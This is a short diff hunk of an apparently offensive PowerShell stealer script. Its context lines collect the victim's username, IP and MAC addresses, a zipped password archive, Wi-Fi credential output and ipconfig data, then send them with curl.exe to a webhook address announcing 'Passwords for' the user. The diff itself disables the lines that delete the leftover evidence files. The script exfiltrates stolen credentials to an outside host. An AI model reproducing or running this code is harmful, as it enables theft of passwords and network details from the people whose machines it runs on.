@@ -18,12 +18,12 @@ $ipv4=(ipconfig /all | findstr /R "IPv4")
 #send http
 Start-Process curl.exe -F "content=Passwords for: $whoami_content | IP: $ipv4[0] | Public: $ipv4[1] | MacAddress: $mac | IPv6: $ipv6 \n@everyone" -F "file1=@$zip" -F "file2=@$e\wifi.txt" -F "file3=@$e\ipcfg.txt" $wh > $null 2>&1
 
-#cls # clear console
+
 # cleanup
 
-Remove-Item -Path "$e\wifi.txt"
-Remove-Item -Path "$e\ipcfg.txt"
-Remove-Item -Path "$zip"
+#Remove-Item -Path "$e\wifi.txt"
+#Remove-Item -Path "$e\ipcfg.txt"
+#Remove-Item -Path "$zip"
 #exit quickly
 #taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
 #echo sent!
